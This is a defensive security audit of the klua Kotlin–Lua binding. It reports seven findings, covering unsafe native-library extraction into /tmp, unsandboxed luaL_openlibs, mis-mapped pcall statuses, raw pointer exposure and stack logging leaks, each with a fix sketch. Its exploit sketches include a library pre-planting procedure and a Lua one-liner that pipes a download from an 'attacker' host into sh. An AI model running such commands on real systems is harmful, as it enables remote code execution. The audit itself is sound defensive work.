# Security Review — klua

Scope: `src/commonMain/kotlin/pw/binom/lua/*`, `src/jvmMain/kotlin/pw/binom/lua/*`,
`src/jvmMain/c/klua_jni.c`, `src/posixMain/kotlin/pw/binom/lua/*`, build packaging.

Threat model: klua is a Lua 5.4 binding library. It loads a native shared library from
inside the JVM jar, executes Lua scripts from Kotlin, exposes `ObjectContainer` for
Kotlin↔Lua bridging, and exposes raw native pointers on its public API. Callers may
embed it in contexts where Lua sources are untrusted, or where another local process
shares the host's tmp directory. Below are the security-sensitive flows identified.

---

## Findings

### 1. Insecure native library extract-and-load in shared tmp dir (CWE-426, CWE-377)
- **Type:** Security
- **Severity:** Error
- **Location:** `src/jvmMain/kotlin/pw/binom/lua/NativeLoader.kt:12-21` (prefix `fun load() {`), and `:46-49` (prefix `val dir = File(System.getProperty("java.io.tmpdir"), "jlua/$VERSION")`), and `:51-67` (`extractFromJar`).
- **Description:**
  Threat: arbitrary native code execution in the host JVM the first time the library
  is loaded on a host where `java.io.tmpdir` (typically `/tmp`) is writable by other
  local users/processes. `NativeLoader.load()` extracts `libklua.so` / `klua.dll` /
  `klua.dylib` from the jar into `java.io.tmpdir/jlua/1.2.0-debug/`, and — critically
  — only writes the file when it does not already exist (`if (!cached.exists())`).
  An attacker who pre-creates the directory and plants a malicious `.so` at that
  exact path BEFORE the victim JVM runs wins: `cached.exists()` is true, the extract
  is skipped, and `System.load(cached.absolutePath)` runs the attacker's `JNI_OnLoad`
  / `JNI_OnUnload` in the victim process. Sticky bit on `/tmp` only protects existing
  files from being renamed/deleted by non-owners; it does not stop a fresh
  pre-creation, and `System.load` does not check ownership.

  Attacker controls: anything reachable via `java.io.tmpdir` on the host (local
  process, another login session, container co-tenant with shared tmp, a compromised
  co-resident service running as the same uid). The attack needs no JVM-side code
  execution; it pre-plants the file.

  Exploit sketch:
  1. Attacker runs `mkdir -p /tmp/jlua/1.2.0-debug` and writes their payload to
     `/tmp/jlua/1.2.0-debug/libklua.so` (or `.dll`/`.dylib`) with `JNI_OnLoad`
     that exfiltrates env / spawns a shell.
  2. Victim starts any program that uses klua. `LuaNative.<clinit>` triggers
     `NativeLoader.load()`. `cached.exists()` is true → extract skipped →
     `System.load("/tmp/jlua/1.2.0-debug/libklua.so")` → `JNI_OnLoad` runs with
     the victim's privileges.

  Additional secondary issues folded into this finding:
  - The `VERSION = "1.2.0-debug"` constant is hard-coded and independent of the
    jar contents, so two different builds of the library share the same on-disk
    path and a stale `.so` from an older build is loaded silently.
  - `extractedFile` uses `dir.mkdirs()` with no permission set (default umask
    022 → 0755), and the `FileOutputStream` in `extractFromJar` creates the file
    with default 0644. Once extracted, the `.so` is world-readable, which is the
    norm but combined with the pre-plant path makes the attack surface larger.
  - `extractFromJar` is not atomic and is not synchronized: two threads racing
    into `load()` can both decide the file is missing and clobber each other's
    output (reliability, not direct security).
  - There is no integrity check (hash/signature) of the extracted bytes against
    the jar contents, so a corrupted/partial extract is also loaded on next run.

- **Fix sketch:**
  1. Do not extract into a shared, predictable path. Use `Files.createTempDirectory`
     with `PosixFilePermissions.asFileAttribute(EnumSet.of(OWNER_READ, OWNER_WRITE,
     OWNER_EXECUTE))` (0700) under the per-user cache (`~/.cache/klua/`) or a
     `SecureRandom`-derived sub-directory. Always create a temp file, write the
     bytes, verify a SHA-256 of the file, then `Files.move(..., ATOMIC_MOVE)` to
     the final name.
  2. Verify ownership/permissions on any pre-existing cache directory before
     using it (`Files.getOwner` + `Files.getPosixFilePermissions`). Refuse if
     owned by another user or world-writable.
  3. Embed a checksum of each per-platform `.so` in the build (resource file) and
     verify it after writing the extracted file; refuse to `System.load` on mismatch.
  4. Make the cache path content-addressed (hash of `.so` bytes) so pre-planting
     requires guessing the hash.
  5. For thread safety, synchronize the entire `load()` body on a class-level lock
     (or use a `ConcurrentHashMap<String, CompletableFuture<File>>` pattern) so
     concurrent first-loaders cannot race the extract step.

---

### 2. Full standard library load grants untrusted Lua unconstrained RCE (`luaL_openlibs`)
- **Type:** Security
- **Severity:** Error
- **Location:**
  - JVM: `src/jvmMain/c/klua_jni.c:249-254` (prefix `lua_State* L = luaL_newstate(); luaL_openlibs(L);`)
  - posix: `src/posixMain/kotlin/pw/binom/lua/LuaContext.kt:13-17` (prefix `init { luaL_openlibs(state) }`)
- **Description:**
  Threat: any Lua code passed to `LuaEngine.eval(text)` or invoked through
  `LuaEngine.call(...)` / `ObjectContainer.makeClosure` runs with the full set of
  Lua 5.4 standard libraries (`linit.c:57-63`): `base`, `package`, `coroutine`,
  `table`, `io`, `os`, `string`, `math`, `utf8`, `debug`. This is the dangerous-
  permissions case called out in the role brief: `os.execute`, `io.open`,
  `package.loadlib` (and on platforms with Lua's `ffi` the C-level `dlopen`) give
  the Lua program arbitrary OS command execution, arbitrary filesystem access, and
  arbitrary shared-library loading. `debug` library also gives introspective access
  to internals (stack inspection, hook installation). The engine has no sandbox
  switch — both the JVM (`Java_pw_binom_lua_LuaNative_newState` line 253) and the
  posix `LuaContext.init` line 15 unconditionally call `luaL_openlibs`.

  Attacker controls: any Lua source string an attacker can convince the host
  application to feed into `eval` / `call`. Typical embeddings (config DSLs, game
  mod scripts, plugin sandboxes) treat the script as "trusted user content" but the
  library provides no mechanism to drop that trust boundary — every embedding
  inherits full RCE into the host process.

  Exploit sketch: `engine.eval("os.execute('curl http://attacker/x | sh')")` —
  the Lua script spawns a child process running arbitrary native code in the JVM.

- **Fix sketch:**
  1. Provide an opt-in sandboxed context constructor (e.g.
     `LuaEngine(safeMode = true)`) that calls a hand-picked subset
     (`luaopen_base`, `luaopen_string`, `luaopen_table`, `luaopen_math`,
     `luaopen_utf8`) and explicitly excludes `os`, `io`, `package`, `debug`.
     Implement this on both JVM (`Java_pw_binom_lua_LuaNative_newStateEx` taking a
     flag) and posix (`LuaContext(openLibs: Boolean)`).
  2. Default the existing constructor to the safe subset, or at minimum document
     loudly that `luaL_openlibs` is unconditionally called and that callers must
     validate Lua sources if they come from untrusted input.
  3. For Lua code that legitimately needs `package`, expose it only when the host
     provides a vetted package search path (no C `loadlib`).

---

### 3. `pcallCall` mis-maps Lua pcall status and discards runtime error messages
- **Type:** Security
- **Severity:** Error
- **Location:** `src/jvmMain/kotlin/pw/binom/lua/LuaValue.kt:440-460` (function `pcallCall`, prefix `internal fun pcallCall(ll: LuaContext, args: List<LuaValue>): List<LuaValue>`), specifically the misaligned `when (r)` cases at lines 451-459.
- **Description:**
  Threat: the wrapper used for every RefObject (`UserData`, `TableRef`,
  `FunctionRef`) `call(vararg args)` invocation silently discards the Lua error
  message for the most common runtime-error case and uses incorrect status text for
  the memory-error / message-handler-error cases. This matches the role's
  "pcall wrapper that hides the underlying error from the caller (could mask
  C-level crashes)" exactly.

  Lua 5.4 pcall statuses (lua.h):
  `LUA_OK=0, LUA_YIELD=1, LUA_ERRRUN=2, LUA_ERRSYNTAX=3, LUA_ERRMEM=4, LUA_ERRERR=5.`

  The mapping in `pcallCall`:
  - `r == 4` → reads `toString(-1)` and throws `LuaException(msg)` — labelled
    "runtime error", but `4` is `LUA_ERRMEM` (memory error, Lua leaves no message
    string for this case, so `msg` will be the null-fallback "runtime error").
  - `r == 5` → throws `RuntimeException("memory allocation error")` — but `5` is
    `LUA_ERRERR` (error in message handler), not memory.
  - `r == 6` → throws `RuntimeException("error while running the message handler")`
    — `6` is not a valid Lua pcall status.
  - `r == 2` (the actual `LUA_ERRRUN` runtime error, the most common case) falls
    into `else` → `RuntimeException("Unknown pcall status: 2")`, **discarding the
    Lua error string sitting on the stack**. The correct counterpart is
    `pcallProcessing` in the same package (line 178), which does handle `2`
    correctly.

  Exploit sketch: an attacker who can cause a Lua runtime error inside a Kotlin-
  registered callback (out-of-memory, stack overflow, `error("exfil")`, calling a
  Kotlin method that itself throws a JNI-level exception which Lua re-raises) sees
  the wrapper throw `RuntimeException("Unknown pcall status: 2")`. The actual
  crash signal — which would tell the host "something went wrong in Lua land" — is
  replaced by a generic message that also makes the Kotlin-side stack trace look
  like a wrapper bug, not a Lua fault. For production diagnostics and for
  audit-logging of Lua errors, this is exactly the masking the role warns about.

- **Fix sketch:** Copy the mapping from `pcallProcessing` (in
  `LuaEngine.kt:175-190`) which is correct: `2 → LuaException(toString(-1) ?:
  "<lua error: type=$errType>")`, `4 → RuntimeException("memory allocation error")`,
  `5 → RuntimeException("error while running the message handler")`,
  `else → RuntimeException("Unknown pcall status: $r")`. Better still, factor the
  `pcallProcessing` helper into a shared internal function used by both call sites
  so they cannot drift again.

---

### 4. Public Kotlin API exposes raw native pointers via constructors and properties
- **Type:** Security
- **Severity:** Warning
- **Location:**
  - JVM: `src/jvmMain/kotlin/pw/binom/lua/LuaValue.kt:72` (`actual class LightUserData(val ptr: Long?)`), `:32-35` (`val ptr: Long?` on `UserData`).
  - posix: `src/posixMain/kotlin/pw/binom/lua/LuaValue.kt:46-48` (`actual class LightUserData(var lightPtr: COpaquePointer?)` with public mutable backing field), `:35-37` (`val ptr: COpaquePointer?` on `UserData`).
- **Description:**
  Threat: both `LightUserData(ptr)` (public primary constructor) and
  `UserData.ptr` / `UserData.toLightUserData` (public properties) hand callers a
  raw native pointer (`Long?` on JVM, `COpaquePointer?` on posix). On the JVM
  side the pointer is a `StaticRefs` map key (so misuse merely produces wrong
  lookups, low impact), but on the posix side `LightUserData.value` is
  `lightPtr.toKotlinObject()` which calls `asStableRef<Any>().get()` — i.e.
  dereferences the pointer as if it were a live `StableRef`. A Kotlin caller
  (or a Kotlin script that an embedding later evaluates) can construct
  `LightUserData(someArbitraryCPointer)` and then read `.value`; the
  `asStableRef<Any>().get()` will treat the raw address as a `StableRef` header
  and either crash or surface an arbitrary heap object reference (info leak /
  type confusion in an interpreter that hands the value back to Lua). The
  `UserData.ptr` getter also walks `lua_touserdata` and reinterprets the payload
  as `klua_pointer` (`Heap.getPtrFromPtr`), giving scripts/Kotlin code a way to
  observe and feed raw addresses through `LightUserData`.

  Attacker controls: anything that can reach the Kotlin-level `LightUserData`
  constructor or the `UserData.ptr` property. In typical embeddings this is the
  host application itself, so this is a hygiene / sandbox-escape finding rather
  than a remote-RCE: an embedding that exposes the Lua binding to scripting
  inherits a way to fabricate pointers.

  Exploit sketch (posix): a Kotlin script does
  `val p = LuaValue.LightUserData(somePtr); val obj = p.value` →
  `obj` is whatever the Kotlin runtime decides lives at `somePtr + sizeof(header)`,
  which is undefined and may yield any heap object.

- **Fix sketch:**
  1. Make `LightUserData`'s primary constructor `internal` on both targets; expose
     only the `LightUserData(value: Any?)` factory and require that pointer round-
     trips go through a vetted Kotlin-side wrapper.
  2. Mark `UserData.ptr` / `UserData.toLightUserData` `@RequiresOptIn` or `internal`
     so they aren't part of the embedder-facing surface; if the pointer must be
     observable, expose it as an opaque `Long` token that cannot be fed back into
     `LightUserData(value: Any?)` without an explicit `unsafeFromPointer(ptr)`
     opt-in.
  3. On posix, add a guard in `toKotlinObject()` that asserts the pointer was
     produced by `StableRef.create` (e.g. via an interned set of known good
     pointers) and rejects arbitrary values.

---

### 5. `DebugTool.printStack` leaks Lua stack values and native pointers to `StdOut`
- **Type:** Security
- **Severity:** WeakWarning
- **Location:** `src/posixMain/kotlin/pw/binom/lua/DebugTool.kt:14-37` (function `LuaState.printStack`, prefix `for (i in 1..count) { ... sb.append(" value:\\\"${lua_tostring(this, i)}\\\"") ... sb.append(\" ptr:\\\"${lua_touserdata(this, i).strPtr()}\\\"\") }`)
- **Description:**
  Threat: the deprecated debug tool `LuaEngine.printStack` (and the common
  `expect fun LuaEngine.printStack` in `DebugTool.kt`) dumps every value on the
  Lua stack, including full string contents (`lua_tostring`) and raw native
  pointers (`lua_topointer` / `lua_touserdata`). Output is routed through
  `StdOut.info` (`StdOut.kt`) which forwards to whatever sink the embedding
  installed — often a logger that ends up in support bundles, telemetry, or a
  crash report. Strings the embedding pushed onto the stack (credentials, tokens,
  file paths, PII) are exposed verbatim.

  Attacker controls: anything that can trigger the printStack path. The function
  is `@Deprecated`, but it is still callable from Kotlin code; a misconfigured
  debug build that retains the call site in a release path leaks to wherever
  `StdOut.func` is wired.

  The pointer leak is a separate concern (ASLR bypass / address disclosure),
  though arguably low-impact since the process already owns those addresses.

- **Fix sketch:**
  1. Truncate string fields (`sb.append(" value:\\\"${lua_tostring(this, i)?.take(64)}\\\"")`).
  2. Hash or redact pointer fields (`sb.append(" ptr:hash=...")`).
  3. Recommend in KDoc that `StdOut.func` route to a redacted sink, and have
     `printStack` itself drop sensitive types (lightuserdata, raw userdata) by
     default.
  4. Remove the deprecated `printStack` from public API in the next major bump.

---

### 6. `LuaContextRegistry` is a single global slot, breaks with multiple engines
- **Type:** Security
- **Severity:** WeakWarning
- **Location:** `src/posixMain/kotlin/pw/binom/lua/LuaContext.kt:36-55` (object `LuaContextRegistry`, prefix `private var current: Pair<LuaState, LuaContext>? = null`)
- **Description:**
  Threat: the comment in `LuaContextRegistry` admits "Single-slot is fine: tests
  run each LuaEngine in its own Kotlin/Native test binary process." That
  assumption is fragile and unsafe in production. If an embedding instantiates two
  `LuaEngine` instances in the same Kotlin/Native process, constructing the second
  one overwrites `current`, and any Lua closure registered against the first
  engine (via `ObjectContainer.makeClosure` or `createACClosure`) will, when
  invoked, call `LuaContextRegistry.lookup(state)` — which returns the second
  engine's `LuaContext`. The callback then `pushValue`/`pop`s against the wrong
  state, which is a memory-corruption / use-of-freed-state vector from the C
  runtime's perspective, and can crash the process or confuse memory management.

  Attacker controls: nothing directly, but any embedding that runs more than one
  engine in a long-lived Kotlin/Native service (the natural pattern for an
  embedding library) hits this. A misbehaving Lua script in engine A that triggers
  a callback after engine B is constructed can corrupt engine B's state.

- **Fix sketch:** Replace the `Pair<LuaState, LuaContext>?` slot with a
  `kotlinx.cinterop.CMap<CPointer<lua_State>?, LuaContext>` (or the simpler
  `mutableMapOf<LuaState, LuaContext>()` guarded by a lock). `register` adds,
  `unregister` removes on engine close, `lookup` reads with read-only access.
  Thread-safety is required: the registry is touched from native C trampolines.

---

### 7. `invokeCallback` catches `Throwable` and converts Errors to a generic message
- **Type:** Security
- **Severity:** Info
- **Location:** `src/jvmMain/kotlin/pw/binom/lua/LuaNative.kt:131-142` (prefix `} catch (e: Throwable) { lastError = e; (1L shl 31) or 0 }`)
- **Description:**
  Threat: the JNI trampoline path (`klua_callback_trampoline` in
  `klua_jni.c:108-145`) catches every `Throwable` from the Kotlin callback,
  including `OutOfMemoryError`, `StackOverflowError`, and `ThreadDeath`. The
  exception is stashed in `@Volatile var lastError`, which the C side then formats
  as `lastErrorMessage` and surfaces via `luaL_error`. The result is that
  unrecoverable JVM failures look like ordinary Lua errors and can be `pcall`-ed
  past by the Lua program, which is the masking pattern the role warns about.

  Attacker controls: any Lua code that can drive a Kotlin callback into an
  allocation-failure or deep-recursion path.

- **Fix sketch:** Re-throw `Error` (specifically `VirtualMachineError`,
  `ThreadDeath`, and `InterruptedException`) after restoring the JNI frame so the
  JVM can handle them normally. Only catch `Exception` for the user-thrown case.
  Move the `lastError` store behind an `AtomicReference<Throwable>` so the
  cross-thread visibility story doesn't rely on `@Volatile` for ordering.

---

## FINDINGS COUNT
7

## SUMMARY
Top: (1) `NativeLoader` pre-plants the JVM's native library in a world-writable
tmp dir and skips extraction if the file already exists — a classic local-RCE /
CWE-426 vector that turns `java.io.tmpdir` into an attacker-controlled dlopen
on any host where another process can create the path; (2) `luaL_openlibs` is
called unconditionally in both JVM and posix `newState`, giving untrusted Lua
full `os.execute` / `io.open` / `package.loadlib` / `debug` access with no
sandbox switch; (3) `pcallCall` mis-maps the Lua pcall status codes and discards
the runtime-error message for the most common case, exactly the "masks C-level
crashes" pattern. Secondary: public raw-pointer exposure on `LightUserData` /
`UserData` (posix especially), `DebugTool.printStack` leaks stack strings and
native addresses, single-slot `LuaContextRegistry` corrupts state under multi-
engine embeddings, and `invokeCallback`'s `catch (Throwable)` swallows VM errors.
